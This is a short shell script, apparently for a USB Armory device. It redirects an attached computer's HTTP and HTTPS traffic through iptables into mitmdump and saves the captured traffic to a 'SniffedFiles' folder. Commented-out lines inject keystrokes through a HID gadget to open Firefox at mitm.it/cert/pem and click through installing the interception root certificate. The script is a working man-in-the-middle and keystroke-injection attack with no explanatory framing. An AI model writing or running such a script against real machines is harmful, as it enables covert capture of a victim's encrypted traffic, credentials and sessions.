#!/bin/sh
#set -x
#set -e

export p2p=/home/usbarmory/String2Hid
export hid=/dev/hidg0
export lang=de
export delay=0.1

# Start tcpdump only HTTP!
#sudo tcpdump -p -s0 -w /home/usbarmory/sniffed-$(date +"%m-%d-%Y-%H-%M").dump &

sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080

FILECOUNT=$(find /home/usbarmory/SniffedFiles/ -type f | wc -l)

sleep 4

# Start mitmdump for HTTP/HTTPS
#mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/OutputAutoQuiet-$(date +"%m-%d-%Y_%H:%M:%S") &
mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/OutputAutoQuiet-$FILECOUNT &

#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080

#sleep 8
#$p2p "\\\"\c\at\\\"" $lang
#sleep 2

#$p2p "firefox http://mitm.it/cert/pem\\n" $lang
#sleep 2
#$p2p " " $lang
#sleep $delay
#$p2p "\t" $lang
#sleep $delay
#$p2p " " $lang
#sleep $delay
#$p2p "\t" $lang
#sleep $delay
#$p2p " " $lang
#sleep $delay
#$p2p "\t" $lang
#sleep $delay
#$p2p "\t" $lang
#sleep $delay
#$p2p "\t" $lang
#sleep $delay
#$p2p "\n" $lang
#sleep $delay
#$p2p "\\\"\cq\\\"" $lang
#sleep 1
#$p2p "exit\\n" $lang
